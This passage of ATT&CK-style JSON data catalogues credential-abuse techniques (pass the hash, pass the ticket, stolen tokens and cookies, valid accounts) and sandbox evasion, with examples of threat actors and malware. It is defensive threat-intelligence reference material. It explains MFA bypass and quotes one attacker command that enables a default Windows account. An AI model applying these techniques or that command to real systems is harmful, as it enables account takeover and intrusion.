once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded. With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account. The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured \u2013 for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.\nDirect API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.  For example, in AWS environments, an adversary who compromises a user\u2019s AWS API credentials may be able to use the sts:GetFederationToken API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated. Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.", "id": "T1550.001", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has used several malicious applications that abused OAuth access tokens to gain access to target email accounts, including Gmail and Yahoo Mail."}, {"id": "S1023", "name": "CreepyDrive", "description": "CreepyDrive can use legitimate OAuth refresh tokens to authenticate with OneDrive."}, {"id": "S0683", "name": "Peirates", "description": "Peirates can use stolen service account tokens to perform its operations. It also enables adversaries to switch between valid service accounts."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used compromised service principals to make changes to the Office 365 environment."}]}, {"name": "Pass the Hash", "description": "Adversaries may \"pass the hash\" using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.", "detailed_description": "Adversaries may \"pass the hash\" using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\nWhen performing PtH, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform Pass the Ticket attacks.", "id": "T1550.002", "examples": [{"id": "G0006", "name": "APT1", "description": "The APT1 group is known to have used pass the hash."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used pass the hash for lateral movement."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used pass the hash for lateral movement."}, {"id": "G0096", "name": "APT41", "description": "APT41 uses tools such as Mimikatz to enable lateral movement via captured password hashes."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda used a registry edit to enable a Windows feature called RestrictedAdmin in victim environments. This change allowed Aquatic Panda to leverage \"pass the hash\" mechanisms as the alteration allows for RDP connections with a valid account name and hash only, without possessing a cleartext password value."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can perform pass the hash on compromised machines with x64 versions."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has dumped password hashes for use in pass the hash authentication attacks."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can perform pass the hash."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can pass the hash to authenticate via SMB."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has used pass-the-hash techniques for lateral movement in victim environments."}, {"id": "S0363", "name": "Empire", "description": "Empire can perform pass the hash attacks."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has used the PowerShell utility Invoke-SMBExec to execute the pass the hash method for lateral movement within an compromised environment."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM used dumped hashes to authenticate to other machines via pass the hash."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT has been observed loading several APIs associated with Pass the Hash."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used pass the hash for authentication to remote access software used in C2."}, {"id": "S0002", "name": "Mimikatz", "description": "Mimikatz's SEKURLSA::Pth module can impersonate a user, with only a password hash, to execute arbitrary commands."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used pass-the-hash tools to obtain authenticated access to sensitive internal desktops and servers."}, {"id": "S0122", "name": "Pass-The-Hash Toolkit", "description": "Pass-The-Hash Toolkit can perform pass the hash."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 has a number of modules that leverage pass the hash for lateral movement."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used the Invoke-SMBExec PowerShell cmdlet to execute the pass-the-hash technique and utilized stolen password hashes to move laterally."}]}, {"name": "Pass the Ticket", "description": "Adversaries may \"pass the ticket\" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.", "detailed_description": "Adversaries may \"pass the ticket\" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\nWhen preforming PtT, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.\nA Silver Ticket can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).\nA Golden Ticket can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. Pass the Hash) while also using the password hash to create a valid Kerberos ticket.", "id": "T1550.003", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 used Kerberos ticket attacks for lateral movement."}, {"id": "G0050", "name": "APT32", "description": "APT32 successfully gained remote access by using pass the ticket."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has created forged Kerberos Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS) tickets to maintain administrative access."}, {"id": "S0002", "name": "Mimikatz", "description": "Mimikatz\u2019s LSADUMP::DCSync and KERBEROS::PTT modules implement the three steps required to extract the krbtgt account hash and create/use Kerberos tickets."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can also perform pass-the-ticket."}, {"id": "S0053", "name": "SeaDuke", "description": "Some SeaDuke samples have a module to use pass the ticket with Kerberos for authentication."}]}, {"name": "Web Session Cookie", "description": "Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.", "detailed_description": "Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.\nAuthentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through Steal Web Session Cookie or Web Cookies, the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.\nThere have been examples of malware targeting session cookies to bypass multi-factor authentication systems.", "id": "T1550.004", "examples": [{"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used stolen cookies to access cloud resources and a forged duo-sid cookie to bypass MFA set on an email account."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has bypassed multi-factor authentication on victim email accounts by using session cookies stolen using EvilGinx."}]}]}, {"name": "Valid Accounts", "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.", "detailed_description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.", "id": "T1078", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team used valid accounts on the corporate network to escalate privileges, move laterally, and establish persistence within the corporate network. "}, {"id": "G1024", "name": "Akira", "description": "Akira uses valid account information to remotely access victim networks, such as VPN credentials."}, {"id": "G0026", "name": "APT18", "description": "APT18 actors leverage legitimate credentials to log into external remote services."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used a compromised account to access an organization's VPN infrastructure."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used valid accounts for initial access and privilege escalation."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used stolen credentials to compromise Outlook Web Access (OWA)."}, {"id": "G0096", "name": "APT41", "description": "APT41 used compromised credentials to log on to other systems."}, {"id": "G0001", "name": "Axiom", "description": "Axiom has used previously compromised administrative accounts to escalate privileges."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles used compromised VPN accounts."}, {"id": "G0008", "name": "Carbanak", "description": "Carbanak actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used a valid account to maintain persistence via scheduled task."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has used compromised user accounts to deploy payloads and create system services."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has compromised user credentials and used valid accounts for operations."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack used hard-coded credentials to gain access to a network share."}, {"id": "S0038", "name": "Duqu", "description": "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware."}, {"id": "G0051", "name": "FIN10", "description": "FIN10 has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor."}, {"id": "G0085", "name": "FIN4", "description": "FIN4 has used legitimate credentials to hijack email communications."}, {"id": "G0053", "name": "FIN5", "description": "FIN5 has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment."}, {"id": "G0037", "name": "FIN6", "description": "To move laterally on a victim network, FIN6 has used credentials stolen from various systems on which it gathered usernames and password hashes."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has harvested valid administrative credentials for lateral movement."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used valid accounts for persistence and lateral movement."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used valid credentials with various services during lateral movement."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM leveraged valid accounts to maintain access to a victim network."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used a compromised Exchange account to search mailboxes and create new Exchange accounts."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has used compromised valid accounts for access to victim environments."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has used valid accounts for initial access and lateral movement. Indrik Spider has also maintained access to the victim environment through the VPN infrastructure."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer can use supplied user credentials to execute processes and stop services."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used credential dumpers or stealers to obtain legitimate credentials, which they used to gain access to victim accounts."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing has used valid SSH credentials to access remote hosts."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has used compromised credentials and/or session tokens to gain access into a victim's VPN, VDI, RDP, and IAMs."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used administrator credentials to gain access to restricted network segments."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has obtained valid accounts to gain initial access."}, {"id": "S0362", "name": "Linux Rabbit", "description": "Linux Rabbit acquires valid SSH accounts through brute force. "}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used valid accounts including shared between Managed Service Providers and clients to move between the two environments."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used compromised VPN accounts to gain access to victim systems."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used compromised credentials to access other systems on a victim network."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used valid VPN credentials to gain initial access."}, {"id": "G0011", "name": "PittyTiger", "description": "PittyTiger attempts to obtain legitimate credentials during operations."}, {"id": "G1040", "name": "Play", "description": "Play has used valid VPN accounts to achieve initial access."}, {"id": "G1005", "name": "POLONIUM", "description": "POLONIUM has used valid compromised credentials to gain access to victim environments."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team have used previously acquired legitimate credentials prior to attacks."}, {"id": "S0053", "name": "SeaDuke", "description": "Some SeaDuke samples have a module to extract email from Microsoft Exchange servers using compromised credentials."}, {"id": "G0091", "name": "Silence", "description": "Silence has used compromised credentials to log on to other systems and escalate privileges."}, {"id": "G0122", "name": "Silent Librarian", "description": "Silent Librarian has used compromised credentials to obtain unauthorized access to online accounts."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used different compromised credentials for remote access and to move laterally."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has used stolen credentials to sign into victim email accounts."}, {"id": "G0039", "name": "Suckfly", "description": "Suckfly used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon relies primarily on valid credentials for persistence."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used valid credentials for privileged accounts with the goal of accessing domain controllers."}], "sub_techniques": [{"name": "Default Accounts", "description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.", "detailed_description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen Private Keys or credential materials to legitimately connect to remote environments via Remote Services.", "id": "T1078.001", "examples": [{"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has abused default user names and passwords in externally-accessible IP cameras for initial access."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has leveraged default credentials for authenticating myWebMethods (WMS) and QLogic web management interface to gain initial access."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used the built-in administrator account to move laterally using RDP and Impacket."}, {"id": "S0537", "name": "HyperStack", "description": "HyperStack can use default credentials to connect to IPC$ shares on remote machines."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound enabled and used the default system managed account, DefaultAccount, via \"powershell.exe\" /c net user DefaultAccount /active:yes to connect to a targeted Exchange server over RDP."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet infected WinCC machines via a hardcoded database server password."}]}, {"name": "Domain Accounts", "description": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.", "detailed_description": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.", "id": "T1078.002", "examples": [{"id": "G1030", "name": "Agrius", "description": "Agrius attempted to acquire valid credentials for victim environments through various means to enable follow-on lateral movement."}, {"id": "G0022", "name": "APT3", "description": "APT3 leverages valid accounts after gaining credentials for use within the victim domain."}, {"id": "G1023", "name": "APT5", "description": "APT5 has used legitimate account credentials to move laterally through compromised environments."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda used multiple mechanisms to capture valid user accounts for victim domains to enable lateral movement and access to additional hosts in victim environments."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used compromised domain accounts to gain access to the target environment."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has obtained highly privileged credentials such as domain administrator in order to deploy malware."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use known credentials to run commands and spawn processes as a domain user account."}, {"id": "S1024", "name": "CreepySnail", "description": "CreepySnail can use stolen credentials to authenticate on target networks."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors used compromised VPN accounts for lateral movement on targeted networks."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has collected credentials from infected systems, including domain accounts."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used domain administrator accounts after dumping LSASS process memory."}, {"id": "G0019", "name": "Naikon", "description": "Naikon has used administrator credentials for lateral movement in compromised networks."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used domain accounts to gain further access to victim systems."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used compromised domain administrator credentials as part of their lateral movement."}, {"id": "C0023", "name": "Operation Ghost", "description": "For Operation Ghost, APT29 used stolen administrator credentials for lateral movement on compromised networks."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used domain credentials, including domain admin, for lateral movement and privilege escalation."}, {"id": "G1040", "name": "Play", "description": "Play has used valid domain accounts for access."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk can use stolen domain admin accounts to move laterally within a victim domain."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used stolen credentials to access administrative accounts within the domain."}, {"id": "S0140", "name": "Shamoon", "description": "If Shamoon cannot access shares using current privileges, it attempts access using hard coded, domain-specific credentials gathered earlier in the intrusion."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used domain administrators' accounts to help facilitate lateral movement on compromised networks."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet attempts to access network resources with a domain account\u2019s credentials."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used stolen domain admin accounts to compromise additional hosts."}, {"id": "G0028", "name": "Threat Group-1314", "description": "Threat Group-1314 actors used compromised domain credentials for the victim's endpoint management platform, Altiris, to move laterally."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has used compromised domain admin credentials to mount local network shares."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used compromised domain accounts to authenticate to devices on compromised networks."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used administrative accounts, including Domain Admin, to move laterally within a victim network."}]}, {"name": "Local Accounts", "description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.", "detailed_description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\nLocal Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.", "id": "T1078.003", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 targets dormant or inactive user accounts, accounts belonging to individuals no longer at the organization but whose accounts remain on the system, for access and persistence."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used legitimate local admin account credentials."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use known credentials to run commands and spawn processes as a local user account."}, {"id": "S0367", "name": "Emotet", "description": "Emotet can brute force a local admin password, then use it to facilitate lateral movement."}, {"id": "G0051", "name": "FIN10", "description": "FIN10 has moved laterally using the Local Administrator account."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has used compromised credentials for access as SYSTEM on Exchange servers."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has used the NT AUTHORITY\\SYSTEM account to create files on Exchange servers."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used a tool called GREASE to add a Windows admin account in order to allow them continued access via RDP."}, {"id": "S0368", "name": "NotPetya", "description": "NotPetya can use valid credentials with PsExec or wmic to spread itself to remote systems."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used local account credentials found during the intrusion for lateral movement and privilege escalation."}, {"id": "G1040", "name": "Play", "description": "Play has used valid  local accounts to gain initial access."}, {"id": "G0056", "name": "PROMETHIUM", "description": "PROMETHIUM has created admin accounts on a compromised host."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used compromised local accounts to access victims' networks."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has used known administrator account credentials to execute the backdoor directly."}, {"id": "G0010", "name": "Turla", "description": "Turla has abused local accounts that have the same password across the victim\u2019s network."}, {"id": "S0221", "name": "Umbreon", "description": "Umbreon creates valid local users to provide access to the system."}]}, {"name": "Cloud Accounts", "description": "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. ", "detailed_description": "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. \nService or user accounts may be targeted by adversaries through Brute Force, Phishing, or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto Remote Services. High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based Software Deployment Tools to run commands on hybrid-joined devices.\nAn adversary may create long lasting Additional Cloud Credentials on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication.\nCloud accounts may also be able to assume Temporary Elevated Cloud Access or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through Cloud API or other methods.", "id": "T1078.004", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has used compromised Office 365 service accounts with Global Administrator privileges to collect email from user inboxes."}, {"id": "G0016", "name": "APT29", "description": "APT29 has gained access to a global administrator account in Azure AD and has used Service Principal credentials in Exchange."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used compromised Office 365 accounts in tandem with Ruler in an attempt to gain control of endpoints."}, {"id": "G1023", "name": "APT5", "description": "APT5 has accessed Microsoft M365 cloud environments using stolen credentials. "}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider leveraged compromised credentials from victim users  to authenticate to Azure tenants."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used compromised credentials to sign into victims\u2019 Microsoft 365 accounts."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has used compromised credentials to access cloud assets within a target organization."}, {"id": "S1091", "name": "Pacu", "description": "Pacu leverages valid cloud accounts to perform most of its operations."}, {"id": "S0683", "name": "Peirates", "description": "Peirates can use stolen service account tokens to perform its operations."}, {"id": "S0684", "name": "ROADTools", "description": "ROADTools leverages valid cloud credentials to perform enumeration operations using the internal Azure AD Graph API."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used a compromised O365 administrator account to create a new Service Principal."}]}]}, {"name": "Virtualization/Sandbox Evasion", "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.", "detailed_description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.", "id": "T1497", "examples": [{"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla has the ability to perform anti-sandboxing and anti-virtualization checks."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can attempt to overload sandbox analysis by sending 1550 calls to printf."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal can check to determine if the compromised system is running on VMware."}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta can make a random number of calls to the kernel32.beep function to hinder log analysis."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee has the ability to perform anti-virtualization checks."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has removed various hooks before installing the trojan or bootkit to evade sandbox analysis or other analysis software."}, {"id": "S0023", "name": "CHOPSTICK", "description": "CHOPSTICK  includes runtime checks to identify an analysis environment and prevent execution on it."}, {"id": "S0046", "name": "CozyCar", "description": "Some versions of CozyCar will check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment. If it detects that it is, it will exit."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel malware has employed just-in-time decryption of strings to evade sandbox detection."}, {"id": "S0554", "name": "Egregor", "description": "Egregor has used multiple anti-analysis and anti-sandbox techniques to prevent automated analysis by sandboxes."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can use junk code to generate random activity to obscure malware behavior."}, {"id": "S0499", "name": "Hancitor", "description": "Hancitor has used a macro to check that an ActiveDocument shape object in the lure message is present. If this object is not found, the macro will exit without downloading additional payloads."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has manipulated Keitaro Traffic Direction System to filter researcher and sandbox traffic."}, {"id": "S1020", "name": "Kevin", "description": "Kevin can sleep for a time interval between C2 communication attempts."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has embedded a \"vmdetect.exe\" executable to identify virtual machines at the beginning of execution."}, {"id": "C0005", "name": "Operation Spalax", "description": "During Operation Spalax, the threat actors used droppers that would run anti-analysis checks before executing malware on a compromised host."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon has the ability to use anti-detection functions to identify sandbox environments."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin contains real and fake second-stage payloads following initial execution, with the real payload only delivered if the malware determines it is not running in a virtualized environment."}, {"id": "S0148", "name": "RTM", "description": "RTM can detect if it is running within a sandbox or other virtualized analysis environment."}, {"id": "G1031", "name": "Saint Bear", "description": "Saint Bear contains several anti-analysis and anti-virtualization checks."}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has contained a hardcoded list of IP addresses to block that belong to sandboxes 